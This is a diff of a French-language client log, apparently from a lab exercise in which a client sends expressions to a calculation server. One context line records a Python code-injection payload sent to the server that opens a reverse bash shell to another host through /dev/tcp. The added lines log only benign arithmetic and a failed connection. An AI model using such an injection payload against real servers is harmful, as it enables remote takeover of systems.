@@ -89,3 +89,9 @@
 2024-10-25 10:23:30 INFO Réponse reçue du serveur 10.33.66.78 : b''
 2024-10-25 10:23:30 INFO Message envoyé au serveur 10.33.66.78 : __import__('os').popen('bash -i >& /dev/tcp/10.33.73.77/6666 0>&1').read()
 2024-10-25 10:23:30 INFO Réponse reçue du serveur 10.33.66.78 : b''
+2024-10-25 12:32:12 INFO Connexion réussie à 10.3.1.10:13337
+2024-10-25 12:32:12 INFO Réponse reçue du serveur 10.3.1.10 : b'Hello'
+2024-10-25 12:32:17 INFO Message envoyé au serveur 10.3.1.10 : 5+6
+2024-10-25 12:32:17 INFO Réponse reçue du serveur 10.3.1.10 : b'11'
+2024-10-25 12:32:55 INFO Connexion réussie à 10.3.1.10:13337
+2024-10-25 12:33:15 ERROR Impossible de se connecter au serveur 10.3.1.10 sur le port 13337
